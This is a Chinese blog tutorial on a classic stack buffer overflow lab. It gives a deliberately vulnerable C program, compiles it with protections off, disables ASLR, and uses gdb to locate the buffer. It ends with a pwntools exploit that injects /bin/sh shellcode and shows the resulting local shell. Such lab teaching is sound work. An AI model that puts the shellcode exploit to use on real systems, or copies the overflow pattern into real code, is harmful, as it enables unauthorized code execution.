---
layout: post
title:  "Return Oriented Programming-1"
author: Triangleowl
categories: ROP
permalink: /:categories/:title
---
源代码如下:

```C
$ cat level1.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void vulnerable_function(){
    char buf[128];
    read(STDIN_FILENO, buf, 256);
}
int main()
{
    vulnerable_function();
    write(STDOUT_FILENO, "Hello, World\n", 13);
    return 0;
}
```
### step1:编译源文件

*`32`位系统:*
```
      gcc -fno-stack-protector -zexecstack level1.c -o level1
```
*`64`位系统:*
```
      gcc -fno-stack-protector -z execstack level1.c -o level1 -m32
```

其中 `-fno-stack-protector`作用是关掉stack protector, `-zexecstack`作用是关掉`DEP`。

### step2:关闭`ASLR`
执行：
```
      sudo -s
      echo 0 > /proc/sys/kernel/randomize_va_space
      exit
```

### step3:反汇编`level1`

```
$ objdump -d level1

0000054d <vulnerable_function>:
 54d:	55                   	push   %ebp
 54e:	89 e5                	mov    %esp,%ebp
 550:	53                   	push   %ebx
 551:	81 ec 84 00 00 00    	sub    $0x84,%esp
 557:	e8 6a 00 00 00       	call   5c6 <__x86.get_pc_thunk.ax>
 55c:	05 78 1a 00 00       	add    $0x1a78,%eax
 561:	83 ec 04             	sub    $0x4,%esp
 564:	68 00 01 00 00       	push   $0x100
 569:	8d 95 78 ff ff ff    	lea    -0x88(%ebp),%edx        #the address of buf is $ebp-0x88
 56f:	52                   	push   %edx
 570:	6a 00                	push   $0x0
 572:	89 c3                	mov    %eax,%ebx
 574:	e8 57 fe ff ff       	call   3d0 <read@plt>
 579:	83 c4 10             	add    $0x10,%esp
 57c:	90                   	nop
 57d:	8b 5d fc             	mov    -0x4(%ebp),%ebx
 580:	c9                   	leave  
 581:	c3                   	ret    
```
通过查看`vulnerable_function()`的汇编代码可以知道`buf`的地址为`$ebp-0x88`,即`vulnerable_function()`函数的`stack`分布为：
```
      |----------------------|
      |                      |
      |----------------------|<-----return address(ebp+0x04)
      |                      |
      |----------------------|<-----ebp
      |                      |
      |                      |
      |                      |
      |                      |
      |                      |
      |----------------------|<-----buf(ebp-0x88)
```
所以只要读入的数据大于`0x88+0x04`就覆盖掉返回地址。接下来只要确定`buf`的地址，用`buf`的地址覆盖`return address`即可将执行`buff`内的`shellcode`.

### step4:确定`buff`的地址

这里选用`140(0x88+0x04)`个`a`和`bbbb`来作为输入，使程序`crash`。
```
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
```
在执行`level1`之前要先开启`core dump`,具体做法为：
```
ulimit -c unlimit
sudo -s
echo "/tmp/core.%t" > /proc/sys/kernel/core_pattern
exit
```
然后执行`level1`：
```
$ ./level1
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbb
Segmentation fault (core dumped)
```
使用`gdb`确定`buf`的地址：
```
$ gdb ./level1 /tmp/core.xxxxxxxx -q
Reading symbols from ./level1...(no debugging symbols found)...done.
[New LWP 30069]
Core was generated by `./level1'.
Program terminated with signal SIGILL, Illegal instruction.
#0  0xffffcf9e in ?? ()
(gdb) x/s $esp-144
0xffffcf10:	'a' <repeats 140 times>, "bbbb\n\317\377\377"
```
此时已经得到了`buf`的地址`0xffffcf10`.

### step5:编写exploit

```
$ cat exp.py
#!/usr/bin/env python
# coding=utf-8
from pwn import *

p = process('./level1')
ret =  0xffffcf10

shellcode  = "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
shellcode += "\x0b\xcd\x80"

payload = shellcode + 'A'*(140-len(shellcode)) + p32(ret)

p.send(payload)
p.interactive()
```

### step6:执行结果

```
$ python exp1.py
[+] Starting local process './level1': pid 16267
[*] Switching to interactive mode
$ whoami
owl
```
